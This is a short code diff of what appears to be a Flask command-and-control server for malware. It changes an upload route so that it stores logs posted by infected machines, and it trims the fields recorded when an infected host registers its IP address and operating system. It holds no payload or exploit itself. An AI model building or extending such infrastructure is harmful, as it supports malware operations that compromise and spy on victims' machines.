@@ -10,10 +10,12 @@ def all_clients():
 
 @app.route("/logs")
 def get_log():
+    
     return "this is a log"
 
-@app.route("/Postlogs", methods=['POST'])
+@app.route("/upload", methods=['POST'])
 def connect():
+    fileOps.add_log_malware(request.get_json())
     return "this is a log"
 
 @app.route("/register", methods=['POST'])
@@ -25,12 +27,9 @@ def registry():
     malware_entry = {
         "id": malwareRegistry,
         "ip": request.remote_addr,
-        "os_signature": form_data['OS'],
-        "last_beconed" : "",
-        "logs" : "",
+        "os_signature": form_data['OS']
     }
     
-
     fileOps.add_malware(malware_entry)
 
     return malwareRegistry
